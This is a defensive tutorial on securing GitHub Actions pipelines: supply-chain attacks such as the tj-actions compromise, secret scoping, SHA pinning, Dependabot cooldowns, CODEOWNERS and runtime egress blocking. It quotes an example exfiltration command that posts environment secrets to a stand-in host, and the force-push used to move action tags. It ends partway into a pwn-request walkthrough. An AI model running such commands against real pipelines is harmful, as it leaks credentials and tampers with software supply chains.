# GitHub Actions Security, Secrets & Production Hardening -- The High-Security Bank Vault

> The May 5 doc built the **factory floor** (workflows, jobs, contexts, concurrency). The May 6 doc built the **recipe library** (composite vs reusable, caching, artifacts). The May 7 doc built the **bakery pickup window** (Trivy, Cosign, OIDC to ECR). The May 10 doc built the **shipping department** (config repo, GitHub Environments, ArgoCD handoff). Today we stop building and start **hardening**. Every door already exists; today we install the **bank-vault doors**, the **dual-control safes**, the **armored-truck procedures**, the **audit logs**, and the **vendor-vetting program** on top. This is the Phase 2.7 capstone: the day the pipeline is no longer just *correct*, it's *defensible*.
>
> **The core analogy for today: a high-security bank vault.** Walk it through. The bank has **vault doors** (branch protection rulesets) that only open when the right procedure is followed. It has **keys** (secrets) that are issued in three tiers -- the master key (organization), the branch-manager key (repository), and the single-shift teller key (environment) -- with strict precedence rules about which key opens which door. The bank uses an **identity-based federation system** (OIDC) so tellers don't carry long-lived keys home at night -- they present a badge at the door and a short-lived key is minted on the spot. The bank has **armored truck drivers** (runners) who must be vetted, must drive vehicles that are crushed and rebuilt between trips (ephemeral runners), and must never operate in public alleys (self-hosted on public repos). The bank has **dual-control safes** (required reviewers on environments) where two officers must turn keys simultaneously to release prod credentials. The bank vets every **vendor and supplier** (third-party actions) and stamps each shipment with an immutable serial number (SHA pinning), because in March 2025 a vendor named `tj-actions` was compromised and 23,000 banks that trusted vendor labels instead of serial numbers had their cash counted on the front page of the newspaper. And every door, every key, every truck, every safe writes to an **immutable audit log** (the GitHub audit log + artifact attestations + Sigstore transparency log) so any breach can be reconstructed, prosecuted, and prevented.
>
> Three corollaries to bolt on. **(1) Defense in depth is not redundancy -- it is independence.** Each layer must defeat a different attacker capability. SHA pinning defeats vendor compromise. OIDC defeats credential theft. Environment reviewers defeat malicious-insider PRs. Ephemeral runners defeat lateral-movement persistence. Branch rulesets defeat workflow tampering. If you remove any single layer the bank is no longer "less secure" -- it is **specifically vulnerable to one named class of attack**, and your incident postmortem will read like a CISA advisory. **(2) The serial number is the security boundary, not the label.** A vendor label (`@v4`, `@main`) is a sticker the vendor can move. A serial number (`@a5ac7e51b41094c92402da3b24376905380afc29`) is the physical content. When `tj-actions/changed-files` was compromised on 2025-03-14, every consumer who pinned by label was robbed; every consumer who pinned by serial number was untouched. There is no clever YAML that closes this gap -- you pin to the SHA or you accept that your supply chain is your weakest vendor. **(3) The audit trail is your only defense after a breach.** Every other control is preventive; the audit log is the *only* one that helps you on day-after. OIDC token issuance, environment approvals, secret access events, workflow runs -- all of it must land in a SIEM you control, with retention longer than the legally-mandated breach-disclosure window, or your "we contained the incident in 4 hours" claim is a vanity metric you cannot prove in court.

---

**Date**: 2026-05-11
**Topic Area**: cicd
**Difficulty**: Advanced

---

## TL;DR -- Concepts at a Glance

| Concept | Real-World Analogy | One-Liner |
|---------|-------------------|-----------|
| Defense-in-depth | Vault doors + cameras + dual-control safes + vendor vetting | Each layer defeats a *different* named attacker capability, not the same one again |
| SHA pinning | Stamping a serial number on every vendor shipment | The 40-char commit SHA is the only immutable reference -- tags are stickers the vendor can move |
| `tj-actions` CVE-2025-30066 | The March 2025 vendor heist | Attacker moved all version tags to a malicious commit; 23,000 repos leaked secrets to public logs |
| `@v4` (tag) | A sticker that says "v4" | Mutable; the vendor (or an attacker holding their PAT) can repoint it any time |
| `@SHA # v4.1.1` | Serial number + invoice label | Immutable bytes + human-readable version so Dependabot still works |
| Dependabot for actions | Auto-rotating vendor catalog | Opens PRs that update SHA *and* the trailing comment; preserves immutability + readability |
| `pinact` / `ratchet` | Local conversion tools | Walk every workflow file and rewrite `@v4` -> `@SHA # v4` in one shot |
| Cooldown window | Vendor "soak time" before purchase | 7-14 days delay on Dependabot PRs catches >80% of supply-chain attacks during disclosure window |
| CODEOWNERS on workflows | Security-team sign-off on vendor changes | `/.github/workflows/ @org/security` requires security review on every workflow PR |
| Repository secret | Branch-manager key | Per-repo; up to 100; default home for service-specific creds |
| Environment secret | Single-shift teller key | Per-environment; injected *only after* protection rules pass; the prod-cred home |
| Organization secret | Master key, scoped | Up to 1,000; "all"/"private"/"selected" repo scoping; for SaaS creds shared by every team |
| Secret precedence | Most-specific key wins | Environment > Repository > Organization on name collision |
| `secrets: inherit` | "Hand the called workflow your whole keyring" | Passes *every* caller secret; cross-org silently empty; use explicit mapping |
| `core.setSecret()` | Redacting a serial number with marker pen | Log-redaction best-effort, NOT a data-exfiltration boundary |
| OIDC short-lived creds | Tellers swipe a badge; key minted on the spot | No long-lived AWS keys in any repo or env secret |
| GitHub App token | A bonded service contractor's daily pass | Auto-rotating, per-install, triggers downstream workflows (vs `GITHUB_TOKEN`) |
| `actions/create-github-app-token` | The App-token vending machine | Mints a 1-hour App installation token from App-ID + private key |
| Artifact attestations | Tamper-evident shipping manifest | SLSA v1.0 provenance: workflow, branch, commit, builder -- signed by OIDC identity |
| `attest-build-provenance@v4` | The manifest-stamping clerk | Generates + uploads signed attestation to GitHub + Sigstore transparency log; v4 wraps `actions/attest` |
| `gh attestation verify` | Customs officer at admission | CLI gate: "this image came from `org/repo`'s `release.yml` on `main` by SHA X" |
| Cosign vs attestation | Wax seal vs notarized shipping manifest | Both signed by same OIDC identity; Cosign = "this is the bytes"; attestation = "this is the provenance" |
| Rulesets | Modern vault-door procedure manual | Multiple rules compose additively; tag/push support; smart status-check matching |
| Classic branch protection | Pre-2023 vault-door rule | One rule wins on overlap; exact-string matching; in long-term maintenance mode |
| Bypass actor | Vault-door master override | "Always" mode = backdoor; "Pull request only" mode = right setting |
| Required status check | "All inspections green before opening" | With Rulesets: matches by integration, not by exact check name |
| "Skipped is not success" | A check that didn't run = vault stays sealed | Path-filtered job that skipped fails the rule; fix with status-aggregator-job + `if: always()` |
| Self-hosted runner on public repo | Letting strangers drive your armored truck | NEVER -- fork PR runs attacker code on your network with your IAM role |
| Ephemeral runner | Armored truck crushed and rebuilt per trip | One job per runner pod; no persistence; no lateral-movement target |
| ARC (Actions Runner Controller) | The truck-dispatch yard on K8s | Controller + scale set + listener, JIT registration tokens, scale-from-zero |
| JIT registration token | Truck driver's single-trip license | 1-hour expiry; single-use; near-zero blast radius even if leaked |
| Runner group | "Truck X only drives for shop Y" | Policy primitive isolating which repos can target which runner pool |
| Larger hosted runners | Renting a vault-class truck per trip | 4/8/16/32/64-core; often cheaper than self-hosted for many workloads in 2026 |
| arm64/Graviton runners | More efficient engines | 37% cheaper than equivalent x86; default-fastest for arm64-native builds |
| Jan 2026 pricing reset | Vault rental rates cut up to 39% | Per-minute prices are all-in (platform charge bundled in); biggest savings concentrate on larger + arm64 tiers |
| `GITHUB_STEP_SUMMARY` | Posting a one-page deposit slip per teller shift | Per-job Markdown rendered on the run summary page; 1 MiB limit |
| `::notice ::warning ::error` | Inline marginalia on the ledger | File/line-anchored annotations in PR diff + Files Changed tab |
| GitHub audit log | The vault's master surveillance archive | Workflow runs, env approvals, secret access, OIDC issuance -- 180 days free, longer Enterprise |
| Actions usage metrics API | The vault's per-shift billing tape | `GET /repos/.../actions/usage` -- programmatic cost + runtime SLOs |
| CloudTrail OIDC `sub` claim | The badge-reader's swipe log on the AWS side | Every `AssumeRoleWithWebIdentity` records workflow + run + sub; queryable in Athena |
| Immutable subject claims (Apr 23 2026) | Permanent IDs on the badge | New OIDC sub format: `repo:my-org-{ID}/my-repo-{ID}:...`; defends against same-name re-registration after rename/transfer; default for new repos June 18, 2026 |
| Workflow dependencies block (2026 preview) | `go.sum` for workflow vendors | Coming in 2026: top-level YAML that locks every action + transitive to a SHA |
| Immutable releases (2026 preview) | Vendor-side serial-number enforcement | Coming: vendor publishes a content-addressable artifact GitHub signs; tag CANNOT be repointed |
| Scoped secrets (2026 preview) | Per-shift teller key by default | Coming: explicit `secrets:` allowlists become default; `inherit` deprecated |

---

## The Whole Picture in One Diagram

```
THE VAULT -- DEFENSE IN DEPTH (each layer defeats a DIFFERENT attacker)
==============================================================================

  ATTACKER CAPABILITY                          THE LAYER THAT DEFEATS IT
  -------------------                          -------------------------

  Compromised third-party action      ----->   SHA pinning + Dependabot cooldown +
  (tj-actions, reviewdog)                      org-policy "require SHA"
                                       |
                                       v
  Malicious PR from a fork            ----->   permissions: read-all default +
  (pull_request_target footgun)                NO secrets in PR-trigger workflows +
                                               environment: gates on consuming jobs
                                       |
                                       v
  Workflow tampering on a feature     ----->   CODEOWNERS on /.github/workflows/ +
  branch                                       Ruleset "require pull request reviews"
                                       |
                                       v
  Leaked long-lived AWS keys           ----->  OIDC federation (no stored creds) +
  in repo/env secrets                          environment-scoped `sub:` claim
                                       |
                                       v
  Leaked PAT used for cross-repo       ----->  GitHub App token (auto-rotates) +
  bot writes                                   1-hour expiry + install scoping
                                       |
                                       v
  Persistent compromise on a           ----->  Ephemeral runners (ARC + JIT tokens) +
  self-hosted runner                           runner groups + never on public repo
                                       |
                                       v
  Insider pushing a malicious commit    ----->  Required signed commits +
  to main                                      Ruleset "require linear history" +
                                               Branch ruleset "require status checks"
                                       |
                                       v
  Compromised image bytes in registry   ----->  Cosign signature verification +
  (registry tampering after push)              Artifact attestation verification +
                                               Kyverno / policy-controller at admission
                                       |
                                       v
  Audit-log tampering / log retention   ----->  Export audit log to SIEM (S3+Athena) +
  expiry                                       CloudTrail OIDC `sub` correlation +
                                               Sigstore transparency log (Rekor)
                                       |
                                       v
  Runaway cost / matrix-explosion       ----->  concurrency: groups (May 5) +
  / cron storms                                Actions usage metrics API alerts

CARDINAL RULE: each row above is a DIFFERENT class of attack.
              Remove any one row and you have a specific named CVE-shaped hole,
              not a "slightly less secure" posture.
```

---

## Part 1: The Threat Model -- Pick the Attacker Before You Pick the Control

Every hardening discussion that starts with "let's enable 2FA" or "pin our actions" is starting in the middle. The first question is: **which attacker capabilities matter for this repo, and which control on the right side of the diagram defeats which capability on the left?** Map the attackers first, controls second.

### The seven attacker capabilities a CI/CD estate must defend against

1. **Compromised third-party action publisher.** The attacker holds a PAT (or maintainer credentials) for an action your workflow uses (`actions/checkout`, `docker/build-push-action`, `tj-actions/changed-files`). They push a malicious commit and move tags. **Defeated by:** SHA pinning + Dependabot cooldown + org-level "require SHA" policy.
2. **Compromised transitive action publisher.** Your direct action uses a sub-action (`reviewdog/action-setup` was the transitive vector in the tj-actions chain). You SHA-pinned your direct dep; the transitive dep is still `@v1`. **Defeated by:** the future `dependencies:` lockfile (2026 preview) or, today, forking + vendoring critical actions and re-publishing under your org's namespace.
3. **Malicious PR from a fork.** A drive-by attacker opens a PR with `.github/workflows/evil.yml` or modifies an existing workflow. **Defeated by:** `pull_request` trigger has no secrets and a read-only `GITHUB_TOKEN` by default (covered May 5); `pull_request_target` is the dangerous variant; CODEOWNERS on `.github/workflows/` makes workflow-modifying PRs require security-team approval.
4. **Malicious insider with push access.** An employee with feature-branch push rights tries to add a malicious workflow or modify `release.yml` to exfiltrate secrets. **Defeated by:** branch ruleset "require pull request reviews" + CODEOWNERS for workflow paths + required signed commits + audit log review.
5. **Leaked long-lived credential.** A repo secret containing an AWS access key gets logged accidentally, screen-shared, or appears in a leaked git clone. **Defeated by:** OIDC federation entirely (no stored creds to leak); for SaaS creds where OIDC isn't supported, environment-scoping + GitHub App tokens (1-hour expiry) + periodic rotation.
6. **Runner compromise.** A self-hosted runner gets persistent code (cron job, modified shell rc) that exfiltrates every secret of every job that lands on it. **Defeated by:** ephemeral runners only (ARC with `--ephemeral` flag and JIT tokens), minimal IAM on the runner host, runner groups to isolate workloads.
7. **Audit-trail tampering / blind spot.** An attacker (or careless engineer) deletes workflow run history, or your audit log retention is shorter than your breach-detection window. **Defeated by:** export GitHub audit log to your own SIEM (S3 + Athena), 2-year minimum retention, correlate with CloudTrail `AssumeRoleWithWebIdentity` events.

Memorize these seven as the **threat model checklist**. The rest of this doc is a deep dive into the controls; the only thing that matters is whether you can name *which attacker capability each control stops*.

---

## Part 2: The `tj-actions/changed-files` Case Study -- The Worked Example for Everything Below

You cannot reason about supply chain security in GitHub Actions without knowing this incident cold. It is the worked example that anchors SHA pinning, Dependabot strategy, attestation verification, OIDC environment scoping, and even why `permissions:` matters. Every control in this doc is graded on "would this have helped during tj-actions?"

### Timeline of CVE-2025-30066

**2025-03-12.** Attacker compromises `@tj-actions-bot` PAT (initial vector partially undisclosed; linked to a separate compromise of `reviewdog/action-setup@v1` per CVE-2025-30154 -- the supply chain attacked the supply chain).

**2025-03-14, ~16:00 UTC.** Attacker force-pushes new commits to the `tj-actions/changed-files` repo and **moves every existing version tag** (`v1`, `v2`, ... `v45`, `v45.0.0`, `v45.0.7`, `v46`) to point at the malicious commit `0e58ed8...`. The malicious payload is a Python script that dumps the runner's process memory (which contains every secret injected via `${{ secrets.* }}`), base64-double-encodes it, and writes it into the workflow log -- because **public repo workflow logs are world-readable** until a workflow-author rotates them.

**2025-03-14 through 2025-03-15, ~36 hours.** The action runs on ~23,000 repositories. Every public-repo run leaks every secret that workflow touched: AWS access keys, GHCR push tokens, npm publish tokens, private RSA keys for SSH, OAuth client secrets, Slack bot tokens.

**2025-03-15.** GitHub Security team and Wiz Research independently flag the anomaly. GitHub force-removes the action's repository. CISA adds CVE-2025-30066 to the KEV (Known Exploited Vulnerabilities) catalog within 72 hours, making remediation a federal compliance requirement for FedRAMP/BOD 22-01 customers.

### Who got robbed, who didn't

**Got robbed:** every consumer who used `uses: tj-actions/changed-files@v45` or `@main` or any tag form. The version sticker on the box pointed at malicious bytes. Hundreds of public-repo workflow logs were preserved by archive crawlers before anyone could rotate secrets.

**Did NOT get robbed:** every consumer who used `uses: tj-actions/changed-files@a5ac7e51b41094c92402da3b24376905380afc29 # v45.0.7`. The serial number on the box was a 40-character SHA that the attacker could not retroactively rewrite. Their workflow ran the *old, legitimate* bytes; the malicious commit had a different SHA that no consumer's workflow asked for.

**Got partially robbed:** consumers who SHA-pinned `tj-actions/changed-files` but used `@v1` on the *transitive* `reviewdog/action-setup` that the action itself called. (The full chain was: tj-actions's own workflow used reviewdog; reviewdog was compromised first; the compromise propagated.) This is the gap the **2026 workflow `dependencies:` lockfile** is designed to close -- today you'd need to fork+vendor critical transitive actions or accept the residual risk.

**Got robbed despite SHA pinning:** consumers whose `GITHUB_TOKEN` had `permissions: write-all` (the legacy default) -- even though the malicious payload couldn't run, an *unrelated* action in the same workflow that pulled in compromised code could still write to the repo or rotate webhook secrets. **`permissions: contents: read` at the top of every workflow** is the second-layer mitigation; OIDC short-lived creds and environment-scoped secrets are the third.

### The five lessons that drive the rest of this doc

1. **Pin to the SHA, not the tag. Always. Everywhere. No exceptions.** Even your own internal actions. The reasoning is identical: any human who can hold the maintainer credential of any action can move its tags. Tags are pointers; SHAs are content.
2. **Default to least-privilege `permissions:`.** A compromised action can only do what the workflow's `GITHUB_TOKEN` is permitted to do. `permissions: contents: read` at the top of every workflow, then opt in per-job to `id-token: write`, `packages: write`, `pull-requests: write` only where needed.
3. **Use OIDC short-lived creds for everything that supports it.** Even if an attacker exfiltrates the in-memory token, it expires in 1 hour. Long-lived AWS access keys in env secrets are a 90-day blast-radius decision.
4. **Use environment-scoped secrets for anything prod-bearing.** Environment secrets are not injected until protection rules pass -- a malicious PR can trigger the workflow but cannot read prod secrets because a human reviewer hasn't approved it yet. The OIDC `sub:environment:production` claim (covered May 10) composes with this: AWS only mints prod creds *after* GitHub has already enforced human approval.
5. **Set up audit-log export to your SIEM before you need it.** During the tj-actions disclosure, the question for every affected org was: "did we run this action between 2025-03-12 and 2025-03-15, and on which repos, with which secrets in scope?" Without a queryable audit trail you cannot answer that in less than days; with a queryable audit trail you can answer in minutes and start surgical rotation instead of org-wide panic.

This case study is the spine. Every section below explicitly maps back to "this is the layer that would have helped" or "this is the layer that wouldn't have, and here's the gap."

---

## Part 3: Secret Management -- The Three-Tier Key System

The bank vault has three tiers of keys, and the precedence rules between them are how you minimize blast radius when (not if) one is leaked.

### The three tiers

| Tier | Max count | Scope | Best home for | Blast radius if leaked |
|------|-----------|-------|---------------|------------------------|
| **Organization secret** | 1,000 | All / Private / Selected repos | SaaS API keys shared across every team (Datadog, PagerDuty, Sentry) | Every repo that has access -- potentially the whole org |
| **Repository secret** | 100 | Single repo | Service-specific creds with no env split | Every workflow in that repo |
| **Environment secret** | 100 / env | Single env in single repo, gated by protection rules | Prod database URLs, prod GPG signing keys, prod-only SaaS tokens | Only workflows that declare `environment:` AND passed protection rules |

**Precedence on name collision: environment > repository > organization.** If you have `DATABASE_URL` defined at all three tiers, a job with `environment: production` reads the environment value; a job without `environment:` reads the repository value; if neither is set the org value applies.

The blast-radius math drives the rule: **store secrets at the most restrictive tier that still works.** A token used by one workflow in one repo for one environment goes in environment secrets. A token used by every repo across the org goes in org secrets. The middle tier (repo) is the default but should be questioned every time -- "is this really used by multiple workflows in this repo, or could I move it to an environment?"

### The `secrets: inherit` cross-org silent-empty trap (deeper than May 5)

May 5 introduced this. Here's the full picture:

```yaml
# In: org-A/repo-X/.github/workflows/release.yml
jobs:
  call-shared:
    uses: org-B/shared-workflows/.github/workflows/deploy.yml@v1
    secrets: inherit  # <-- DANGEROUS in two ways
```

What `secrets: inherit` actually does:
- **Within the same org**: passes *every* secret in the caller's scope (repo + env + org-level visible to this repo) to the callee. If the callee runs untrusted action versions, every secret your caller has is now in their address space. **Use explicit `secrets: { NAME: ${{ secrets.NAME }} }` mapping** for any callee that you don't own or that runs third-party actions you haven't SHA-vetted.
- **Across orgs**: the inherit silently passes *nothing* -- the callee runs with an empty secrets context. No error, no warning, just every `${{ secrets.X }}` evaluates to empty string. This is a deliberate security boundary (you can't accidentally exfiltrate one org's secrets to another by way of a reusable workflow), but it's also a footgun: your workflow runs green, your deploy succeeds with empty creds, your downstream API call fails with HTTP 401, and you waste an hour debugging.

The enterprise-level twist: even within a single enterprise that spans multiple orgs, **inheritance does not cross org boundaries**. If your enterprise has `org-prod` and `org-shared`, a workflow in `org-prod` calling a reusable workflow in `org-shared` must pass secrets explicitly. The 2026 scoped-secrets preview (from the security roadmap) is the structural fix: explicit `secrets:` allowlists become the *default* and `inherit` is deprecated in favor of per-secret pass-through.

### Reusable workflow secrets -- the `on.workflow_call.secrets` block

The callee declares which secrets it expects:

```yaml
# In: org-shared/shared-workflows/.github/workflows/deploy.yml
on:
  workflow_call:
    secrets:
      AWS_DEPLOY_ROLE_ARN:
        required: true
        description: "OIDC role ARN for prod deploys"
      DATADOG_API_KEY:
        required: false
        description: "If unset, deploy succeeds but skips Datadog event"

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Use secrets explicitly
        env:
          ROLE: ${{ secrets.AWS_DEPLOY_ROLE_ARN }}
          DD_KEY: ${{ secrets.DATADOG_API_KEY }}
        run: ./deploy.sh
```

The caller maps explicitly:

```yaml
jobs:
  release:
    uses: org-shared/shared-workflows/.github/workflows/deploy.yml@a5ac7e5... # v1.2.0
    secrets:
      AWS_DEPLOY_ROLE_ARN: ${{ secrets.PROD_DEPLOY_ROLE }}
      DATADOG_API_KEY: ${{ secrets.DATADOG }}
```

This is the production-correct pattern. Every secret is named, scope-bounded, auditable in the source of the caller. `inherit` is a convenience that becomes a liability the moment the callee is not entirely under your control.

### Secret rotation strategy

Secrets fall into three categories with three rotation cadences:

| Category | Rotation cadence | Strategy |
|----------|------------------|----------|
| **OIDC-derived** (AWS, GCP, Azure via federation) | None -- minted per-run, 1-hour expiry | No stored credential exists; rotation is structural |
| **GitHub App tokens** (cross-repo writes, ArgoCD callbacks) | 1-hour expiry per use | `actions/create-github-app-token@v2` mints on demand from App-ID + private key; rotate App private key annually |
| **Long-lived static** (SaaS APIs that don't support OIDC, on-prem GitOps, legacy SOAP endpoints) | 90 days | Calendar-scheduled workflow that rotates the upstream credential, updates the GitHub secret via API, audits which workflows consumed it last 90 days |

The OIDC-preferred posture is: use static credentials only when the third party doesn't support OIDC. For the static cases, **store at the most restrictive tier (environment), expose in a single job (not the whole workflow), and rely on log masking only as a last line** -- not as the primary defense.

### `core.setSecret()` masking is best-effort, not a security boundary

Inside a JS action you can register a runtime string for log redaction:

```javascript
const core = require('@actions/core');
const derivedToken = computeFromUpstream();
core.setSecret(derivedToken);  // registers for log masking
console.log(`Using token: ${derivedToken}`);  // will print as "Using token: ***"
```

The corresponding workflow command:

```bash
echo "::add-mask::$DERIVED_VALUE"
```

This is **log redaction**, not data-leak prevention. GitHub's redaction works on **exact string match only** -- if the value `password123` is logged as `passw` + `ord123` in two separate `echo` statements, neither half is redacted. If the action sends the value over HTTP, redaction doesn't apply. If the action writes to a file in the workspace and that file is uploaded as an artifact, redaction doesn't apply. Treat `setSecret`/`add-mask` as a **defense against accidental logging by your own code**, not as a sufficient protection for handling untrusted data.

---

## Part 4: Supply Chain Hardening -- Vetting Every Vendor

The bank doesn't take shipments from anyone with a label. It vets every vendor, stamps a serial number on every box, and requires a security-team signature before adding a new vendor to the approved list. In GitHub Actions, this is the SHA-pinning regime.

### SHA pinning -- the canonical syntax

```yaml
# WRONG -- tag is a mutable pointer the vendor can move
- uses: actions/checkout@v5

# WRONG -- branch is even more mutable
- uses: actions/checkout@main

# RIGHT -- full 40-char SHA + trailing version comment for Dependabot
- uses: actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29 # v4.1.1

# RIGHT -- same pattern for org-internal reusable workflow
- uses: my-org/shared-workflows/.github/workflows/deploy.yml@b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2 # v2.3.0
```

The trailing `# v4.1.1` comment is not decorative -- **Dependabot's GitHub Actions ecosystem reads the comment** to know what semantic version this SHA corresponds to, and rewrites both the SHA and the comment when a new release ships. Without the comment, Dependabot still updates the SHA on the next release, but the human reviewer sees a 40-character diff with no version context, making PR review opaque.

Why SHA pinning is non-negotiable: tags in Git are mutable references. A vendor with maintainer credentials (or an attacker holding their PAT, as in tj-actions) can `git tag -f v4 abc123 && git push --force origin v4` -- the tag now points at a different commit. SemVer doesn't help; even `v4.1.1` is a tag that can be force-moved. Only the SHA itself is the cryptographic identity of the bytes.

### Dependabot for actions -- the auto-rotating vendor catalog

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
      day: "monday"
      time: "09:00"
      timezone: "America/New_York"
    open-pull-requests-limit: 10
    cooldown:
      default-days: 7        # 2025 feature -- delay opening PRs for soak window
      semver-major-days: 14   # major bumps wait longer
    groups:
      actions-minor-and-patch:
        update-types: ["minor", "patch"]
        applies-to: version-updates
      actions-security:
        applies-to: security-updates
    reviewers:
      - "my-org/security-team"
    labels:
      - "dependencies"
      - "github-actions"
    commit-message:
      prefix: "chore(deps)"
      include: "scope"
```

The non-obvious settings:

- **`cooldown`** (released 2025): delays opening update PRs by N days after a release publishes. **This is the single most leverage-rich setting** -- it catches the majority of supply-chain attacks because malicious tag-moves are usually detected and reverted within a week. Set `default-days: 7` for routine updates, `semver-major-days: 14` for major bumps (which need more soak anyway).
- **`groups`**: batches multiple action updates into one PR per group. Reduces PR fatigue (otherwise Dependabot opens one PR per action per week and reviewers stop reading them).
- **`reviewers: my-org/security-team`**: paired with CODEOWNERS, ensures every Dependabot PR for workflow files gets a security-team eyeball.

**The trade-off Dependabot makes explicit**: when you SHA-pin actions, Dependabot's CVE matcher (which works on SemVer ranges, not commit hashes) no longer alerts you to vulnerable action versions automatically. SHA pinning shifts you from "passive alerts" to "active update cadence" -- you must commit to running Dependabot PRs through to merge weekly or you go stale and miss security fixes. The discipline trade is worth it; the structural fix (workflow `dependencies:` lockfile from the 2026 roadmap) will eventually give you both.

### `pinact` and `ratchet` -- local conversion tools

For an existing repo with hundreds of `@v4`-style references, a one-shot conversion:

```bash
# pinact -- the most popular tool as of 2026
brew install pinact
pinact run                              # rewrites all @v4 -> @SHA # v4
pinact run --check                      # CI-mode: fail if any tag form found

# ratchet -- older but well-maintained
brew install sethvargo/ratchet/ratchet
ratchet pin .github/workflows/*.yml
ratchet check .github/workflows/*.yml   # CI-mode

# StepSecurity's Secure Workflows -- free SaaS that opens a PR
# https://app.stepsecurity.io/secureworkflow -- web UI; one-time conversion
```

Add a CI check that runs `pinact run --check` on every PR to prevent regression:

```yaml
- name: Verify all actions are SHA-pinned
  run: |
    docker run --rm -v "$PWD:/work" -w /work \
      ghcr.io/suzuki-shunsuke/pinact:latest \
      pinact run --check
```

This is a structural defense: even a hurried PR author cannot accidentally introduce a `@v4`-style reference because the check fails.

### CODEOWNERS for `.github/workflows/` -- the security-team gate

The single highest-leverage CODEOWNERS rule in the entire repo:

```bash
# .github/CODEOWNERS
# Repo-wide default
*                              @my-org/engineering

# Security-team approval required for any change to workflows
/.github/workflows/            @my-org/security-team
/.github/actions/              @my-org/security-team
/.github/dependabot.yml        @my-org/security-team
/.github/CODEOWNERS            @my-org/security-team

# Platform team owns infra-related code
/terraform/                    @my-org/platform-team
/.github/workflows/release.yml @my-org/security-team @my-org/platform-team
```

But **CODEOWNERS by itself is advisory** -- it suggests reviewers but does not require them. To make it enforced, you must pair it with a branch protection rule (or Ruleset) that says "require pull request reviews from CODEOWNERS." The combination is the actual control; either alone is theater.

The reasoning: in the tj-actions incident, several affected orgs had `.github/workflows/release.yml` modified to add the compromised action a week earlier by a feature-branch PR that no security reviewer saw. CODEOWNERS + "require CODEOWNERS approval" would have flagged that PR for security review before merge.

### Signed commits requirement

```bash
# Ruleset: "Require signed commits"
# Every commit on main must have a verifiable GPG/SSH signature
# Defeats: attacker with stolen branch-push creds but no signing key
```

The cost is non-zero -- onboarding every engineer requires setting up `gpg` or `ssh` signing keys, and merging Dependabot PRs requires bot accounts with signing keys configured (`actions/create-github-app-token` mints App tokens, and GitHub Apps can sign commits via the API). The benefit is that an attacker who steals a developer's GitHub PAT cannot push to main without also having that developer's signing key.

### Dependency review action -- the runtime npm/pip/etc. check

For application-level dependencies (not actions):

```yaml
# .github/workflows/pr-checks.yml
name: PR Checks
on:
  pull_request:
    branches: [main]

permissions:
  contents: read
  pull-requests: write  # for posting review comments

jobs:
  dependency-review:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29 # v4.1.1
      - uses: actions/dependency-review-action@5a2ce3f5b92313e4045dd0d4a9eaa0e9d5e23d18 # v4.5.0
        with:
          fail-on-severity: high
          comment-summary-in-pr: on-failure
          deny-licenses: AGPL-1.0-or-later, GPL-2.0-or-later
          allow-ghsas: |
            GHSA-1234-5678-90ab  # explicitly accepted false-positive
```

This blocks PRs that introduce new dependencies with known high-severity CVEs, restricts which licenses are permitted, and posts a review comment summarizing the diff. Doesn't help with action-level supply chain (use SHA pinning for that), but closes the parallel surface for application dependencies.

### Harden-Runner -- the runtime egress defense for what static controls can't see

Every supply-chain control discussed so far -- SHA pinning, Dependabot cooldown, CODEOWNERS, dependency-review -- is **preventive** and **identity-based**: each defeats a specific class of attack by checking the artifact or actor against an allowlist *before* it runs. None of them catch the case where you've SHA-pinned a *direct* action whose own internal `uses:` is a tag reference, whose tag the attacker rewrites tomorrow. In that scenario your direct SHA-pin freezes the bytes you reference but every transitive `uses:` inside those bytes resolves at workflow-run time -- the malicious commit is fetched and executed inside *your* runner, with your runner's ambient credentials. This is exactly the gap the **CVE-2025-30154** half of the tj-actions chain exploited (reviewdog/action-setup was the upstream-of-upstream vector).

**StepSecurity Harden-Runner** is the runtime detective-and-preventive control that closes this gap. Architecture: an action you install at the top of every job that installs an eBPF agent on the runner. The agent enforces a domain/IP egress allowlist at the kernel level inside the runner pod -- any outbound connection to a host not on the allowlist is **blocked AND logged**. Even if a malicious transitive payload executes inside your runner, its `curl -X POST evil.example.com -d "$(env)"` returns connection-refused, the exfiltration attempt fires a runtime alert, and the secrets in the runner's memory never leave.

```yaml
- name: Harden runner with eBPF egress allowlist
  uses: step-security/harden-runner@17d0e2bd7d51742c71671bd19fa12bdc9d40a3d6 # v2.10.1
  with:
    egress-policy: block            # default: audit; flip to block when allowlist is stable
    disable-sudo: true               # narrow privilege escalation surface on runner
    allowed-endpoints: |
      github.com:443
      api.github.com:443
      objects.githubusercontent.com:443
      ghcr.io:443
      registry.npmjs.org:443
      123456789012.dkr.ecr.us-east-1.amazonaws.com:443
      sts.us-east-1.amazonaws.com:443
```

What this catches that nothing else does: the **bidirectional confirmation** of supply-chain compromise. Runner logs from `actions/checkout` and dependent action download stages already record the resolved SHA of every transitive action (`Download action repository 'reviewdog/action-setup@v1' (SHA: <resolved>)`). Cross-reference those resolved SHAs against any post-incident CVE advisories with a single grep across `gh run view --log` output -- if a flagged SHA appears in any workflow run from the disclosure window, that run was compromised. The Harden-Runner egress block tells you whether the malicious code *successfully exfiltrated anything*: a "Network call blocked" alert at the disclosure window's start is the smoking gun that says rotate every credential that run touched. Without Harden-Runner, your runner logs say "we ran the malicious bytes" and your CloudTrail says "and here are the OIDC-derived AWS creds that run minted" -- you have to assume the worst because you can't prove the negative.

The trade-off: the allowlist is a maintenance burden. The right onboarding pattern is to run with `egress-policy: audit` for the first 2-3 weeks per workflow, collect the legitimate egress destinations from Harden-Runner's daily report, build the allowlist from observation, then flip to `block`. Workflows that pull from many unpinned ecosystem registries (`pip install` from PyPI mirrors, `apt-get` from random Ubuntu repos) need the allowlist tuned per environment.

### The `pull_request_target` footgun -- a worked pwn-request attack chain

The vendor-side analog to "compromised third-party action" is "drive-by PR from a fork." It's the second-most-common attacker capability that breaches CI/CD estates and the one developers most often misunderstand. The parallel walkthrough to the self-hosted-runner-on-public-repo attack (covered in Part 7) is the `pull_request_target` pwn-request:

1. **Attacker forks your public repo** and pushes a commit to their fork that modifies an application file -- `src/utils.py`, `package.json`, `Makefile`, or any path the workflow runs against. The actual payload lives in *their* code, not in the workflow file.
